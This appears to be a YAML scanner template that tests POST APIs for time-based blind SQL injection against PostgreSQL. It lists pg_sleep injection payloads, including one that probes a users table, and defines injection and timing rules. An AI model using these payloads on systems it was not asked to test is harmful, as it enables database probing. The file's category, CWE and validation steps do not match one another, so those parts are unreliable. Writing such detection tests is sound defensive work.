id: TIME_BASED_POSTGRESQLI_POST
info:
  name: "Time based SQL injection test for PostgreSQL DB for POST method APIs"
  description: "The Time-Based SQL Injection Test for PostgreSQL DB for POST Method APIs is designed to detect blind SQL injection vulnerabilities in APIs that interact with PostgreSQL databases. In this test, attackers inject SQL queries with intentional time delays, such as `pg_sleep()`, into POST request parameters. By observing the response times, the attacker can infer the existence of a vulnerability and potentially gain insight into the database structure or application logic, even when no direct error messages are returned. This test helps identify blind SQL injection risks where traditional error-based techniques may fail."
  details: "The Time-Based SQL Injection Test for PostgreSQL DB for POST Method APIs works by injecting SQL payloads with time-delay functions like `pg_sleep()` into user input fields in POST requests. When the payload is executed, the PostgreSQL database will intentionally pause the response for a specified time, allowing the attacker to measure the delay in the server's response. By analyzing these delays, the attacker can infer sensitive information about the database schema, tables, or even gain unauthorized access to data. This method is particularly effective in situations where error messages are suppressed or when blind injection is the only viable exploitation technique."
  impact: "The impact of the Time-Based SQL Injection Test for PostgreSQL DB for POST Method APIs can be significant, as it allows attackers to extract sensitive database information without triggering visible errors. By analyzing response delays, attackers can infer details about the database structure, including table names, column data, and even retrieve user credentials. This type of attack can lead to unauthorized data access, potential data exfiltration, or further exploitation of the system. If left unaddressed, this vulnerability can compromise the integrity and confidentiality of the entire database."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: TIME_BASED_POSTGRESQLI_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards:
  GDPR:
    - Article 32
    - Article 25
  HIPAA:
    - 45 CFR ยง 164.312(a)(2)(i)
    - 45 CFR ยง 164.308(a)(5)(ii)(C)
  SOC 2:
    - Logical and Physical Access Controls
    - User Authentication Mechanisms
  PCI DSS:
    - Requirement 8
    - Requirement 10
  ISO 27001:
    - A.9.2.2
    - A.9.4.3
  NIST 800-53:
    - IA-2
    - IA-5
  CSA CCM:
    - IAM-03
    - IAM-06
  CIS Controls:
    - IG1 Safeguard 5.1
    - IG1 Safeguard 5.4
    - IG2 Safeguard 16.11
  FedRAMP:
    - IA-2
    - IA-5
  NIST 800-171:
    - 3.5.1
    - 3.5.2
  FISMA:
    - IA-2
    - IA-5
  Cybersecurity Maturity Model Certification (CMMC):
    - IA.1.076
    - IA.2.078
api_selection_filters:
  method:
    eq: "POST"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  timeBasedPayloads:
    - "' OR 1=1; SELECT pg_sleep(5) -- -"
    - "' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -"
    - "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -"
    - "' OR (SELECT pg_sleep(5) WHERE (SELECT COUNT(*) FROM users) > 10) -- -"
execute:
  type: multiple
  requests:
    - req:
        - add_header:
            dummyKey: dummyVal
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Failed
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid token
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${userVal}${timeBasedPayloads}
        - validate:
            response_code:
              eq: 429
validate:
  and:
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - 5001
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - ${x1.response.stats.median_response_time} * 5
